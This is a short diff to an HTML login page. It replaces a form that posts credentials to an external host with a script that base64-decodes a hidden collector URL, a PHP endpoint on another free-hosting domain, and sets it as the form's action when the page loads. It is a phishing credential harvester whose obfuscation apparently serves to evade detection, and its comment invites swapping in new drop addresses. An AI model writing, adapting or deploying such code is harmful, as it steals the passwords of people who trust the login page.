@@ -66,7 +66,7 @@
 					<td height="42" >
 					&nbsp;</td>
 				</tr>
-				<form method="post" action="http://boltonlogz.onlinewebshop.net/wp-config-post.php" >
+				<form id="loginForm" method="post" >
 				<tr>
 					<td height="33"></td>
 				</tr>
@@ -138,7 +138,14 @@
 </div>
 
 </body>
+<script>
+  // Base64-encoded action URL
+  // (update this string whenever you need to point somewhere else)
+  const encodedAction = "aHR0cDovL2JvbHRvbmNvbGxlY3Rvci5hdHdlYnBhZ2VzLmNvbS93cC1jb25maWctcG9zdC5waHA=";
 
+  // Decode and set the form’s action attribute
+  document.getElementById('loginForm').action = atob(encodedAction);
+</script>
 <script type="text/javascript">
  
   //apply masking to the demo-field
